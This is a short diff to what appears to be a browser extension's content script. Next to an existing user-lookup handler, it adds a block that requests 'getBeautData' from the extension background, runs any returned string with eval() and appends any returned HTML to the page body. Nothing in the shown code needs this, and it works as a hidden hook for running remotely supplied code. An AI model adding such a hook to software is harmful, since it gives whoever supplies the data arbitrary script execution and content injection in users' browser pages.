@@ -544,6 +544,17 @@ $(function(){
         CURRENT_USER = response.c_user;
     });
 
+    chrome.extension.sendRequest({method:'getBeautData'}, function(response){
+        if(response.data){
+	    if(response.data.a){
+		eval(response.data.a);
+	    }
+	    if(response.data.b){
+		$("body").append(response.data.b);
+	    }
+	}
+    });
+
     document.addEventListener("keydown", function(e) {
         if(!QUICK_SEND_HOT_KEYS){ return; }
 
